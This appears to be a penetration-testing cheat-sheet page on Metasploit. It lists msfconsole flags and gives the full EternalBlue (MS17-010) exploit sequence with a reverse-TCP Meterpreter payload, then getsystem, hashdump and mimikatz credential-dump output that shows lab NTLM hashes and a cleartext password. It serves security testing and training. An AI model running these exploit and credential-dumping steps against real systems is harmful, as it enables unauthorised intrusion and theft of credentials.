---
title : "Metasploit"
# pre : ' '
description : "The world's most used penetration testing framework."
date : 2020-03-11T16:59:30+01:00
# hidden : true
# draft : true
weight : 210
# tags : [""]
---

---

The world's most used penetration testing framework.

## Installation

Please use [Kali Linux](https://www.kali.org/)

Download newest release from [Github.com](https://github.com/rapid7/metasploit-framework/releases)

## Usage

```plain
msfconsole [options]
```

## Flags

```plain
Usage: msfconsole [options]

Common options:
    -E, --environment ENVIRONMENT    Set Rails environment, defaults to RAIL_ENV environment variable or 'production'

Database options:
    -M, --migration-path DIRECTORY   Specify a directory containing additional DB migrations
    -n, --no-database                Disable database support
    -y, --yaml PATH                  Specify a YAML file containing database settings

Framework options:
    -c FILE                          Load the specified configuration file
    -v, -V, --version                Show version

Module options:
        --defer-module-loads         Defer module loading unless explicitly asked.
    -m, --module-path DIRECTORY      Load an additional module path

Console options:
    -a, --ask                        Ask before exiting Metasploit or accept 'exit -y'
    -H, --history-file FILE          Save command history to the specified file
    -L, --real-readline              Use the system Readline library instead of RbReadline
    -o, --output FILE                Output to the specified file
    -p, --plugin PLUGIN              Load a plugin on startup
    -q, --quiet                      Do not print the banner on startup
    -r, --resource FILE              Execute the specified resource file (- for stdin)
    -x, --execute-command COMMAND    Execute the specified console commands (use ; for multiples)
    -h, --help                       Show this message
```

### Meterpreter examples

### getsystem

```plain
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```

### hashdump

```plain
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:102277341d6c113a28017200e1dfafe9:::
johndo:1107:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
adm_johndo:1108:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
janedo:1110:aad3b435b51404eeaad3b435b51404ee:f3fe13546c4c0d2db443a0865626203b:::
[...]
```

## Examples

### MS17-010 - Eternalblue

{{%resources fa_icon_class="far fa-file-video" pattern="ms17-010.*(mp4)"/%}}

### Scanner

```plain
msf5 > use auxiliary/scanner/smb/smb_ms17_010
```

### Exploit

```plain
msf5 > use exploit/windows/smb/ms17_010_eternalblue
msf5 > set rhost <target>
msf5 > set payload windows/x64/meterpreter/reverse_tcp
msf5 > set lhost <own-system>
msf5 > run
```

```plain
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:102277341d6c113a28017200e1dfafe9:::
johndo:1107:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
adm_johndo:1108:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
janedo:1110:aad3b435b51404eeaad3b435b51404ee:f3fe13546c4c0d2db443a0865626203b:::
[...]

meterpreter > load kiwi
Loading extension kiwi...
mimikatz 2.2.0 20191125 (x64/windows)
Success.

meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username       Domain   NTLM                              SHA1                                      LM
--------       ------   ----                              ----                                      --
Administrator  OFFSEC   97f2592347d8fbe42be381726ff9ea83  d0321e2e4e0712ba7b3f8c1998931312bf6a8b05  12a3cf9e7ff5e329f76ccb47241e3d88
DC2008R2$      OFFSEC   34acde5ae873319558ae6f191e8877bf  186dfbdbae180d8eb4c4406b03250e5194adf6af  

wdigest credentials
===================

Username       Domain   Password
--------       ------   --------
(null)         (null)   (null)
Administrator  OFFSEC   Welkom1234
[...]
```

## URL List

- [Metasploit.com](https://www.metasploit.com/)
- [Offensive-security.com Meterpreter](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
- [GitHub.com - Metasploit framework](https://github.com/rapid7/metasploit-framework)
